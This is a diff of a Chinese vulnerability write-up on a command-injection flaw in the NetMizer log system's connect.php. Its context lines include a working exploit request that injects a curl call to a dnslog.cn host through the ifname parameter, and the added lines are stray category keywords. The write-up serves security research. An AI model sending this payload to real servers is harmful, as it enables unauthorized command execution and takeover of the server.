@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/manage/connect.php` 文件存在[命令执行](https://mrxn.net/tag/rce "标签：命令执行")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。
 
+软件
+
 # 影响版本
 
 老旧版本
@@ -57,11 +59,21 @@ if($action == "start"){
 }
 ```
 
+深入探索
+
+网络安全
+
+数据管理
+
+防病毒程序与恶意软件
+
 在 `if($action == "start")` 部分，构建的 `$cmd` 字符串直接使用用户输入的 `$ifname`、`$device` 和 `$port` 变量执行系统命令（如 `tcpdump` 和 `ps`、`kill`）。这些变量未经过转义或过滤就直接拼接进命令字符串中，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
+
+网络安全
 
 ```
 GET /data/manage/connect.php?action=start&device=192.168.1.1&ifname=;curl+`whoami`.dnslog.cn+%23+&name=test&port=88 HTTP/1.1
